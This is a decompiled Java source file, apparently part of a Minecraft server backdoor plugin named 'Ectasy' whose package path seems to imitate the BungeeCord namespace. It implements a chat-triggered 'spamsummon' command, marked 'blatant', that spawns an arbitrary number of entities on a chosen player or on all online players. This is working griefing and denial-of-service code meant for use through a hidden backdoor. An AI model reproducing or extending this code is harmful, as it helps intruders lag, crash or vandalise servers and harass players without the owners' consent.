package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import java.util.ArrayList;
import java.util.List;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "spamsummon",
   description = "Summons entities on players",
   blatant = true,
   rank = Rank.FREE
)
public class SpamSummonCommand extends AbstractCommand {

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length != 3) {
         ChatUtil.sendChat(var1.getPlayer(), "Please, use spamsummon <player name> <entity> <amount> or spamsummon * <entity> <amount>");
      } else {
         ArrayList<Player> var4 = new ArrayList<>();
         if (var3[0].equalsIgnoreCase("*")) {
            var4.addAll(Bukkit.getOnlinePlayers());
         } else {
            Player var5 = Bukkit.getPlayer(var3[0]);
            if (var5 == null) {
               ChatUtil.sendChat(var1.getPlayer(), "Player " + var3[0] + " isn't online.");
               return;
            }

            var4.add(var5);
         }

         EntityType var8 = this.getEntityByName(var3[1]);
         if (var8 == null) {
            ChatUtil.sendChat(var1.getPlayer(), "The entity " + var3[1] + " does not exist.");
         } else {
            try {
               int var6 = Integer.parseInt(var3[2]);
               Ectasy.parentPlugin.getServer().getScheduler().runTask(Ectasy.parentPlugin, () -> {
                  for(Player p : var4) {
                     for(int i = 0; i < var6; ++i) {
                        p.getWorld().spawnEntity(p.getLocation(), var8);
                     }
                  }
               });
            } catch (Exception var7) {
               ChatUtil.sendChat(var1.getPlayer(), var3[2] + " is not a valid integer.");
            }
         }
      }
   }

   public EntityType getEntityByName(String var1) {
      for(EntityType var5 : EntityType.values()) {
         if (var5.name().equalsIgnoreCase(var1)) {
            return var5;
         }
      }

      return null;
   }
}
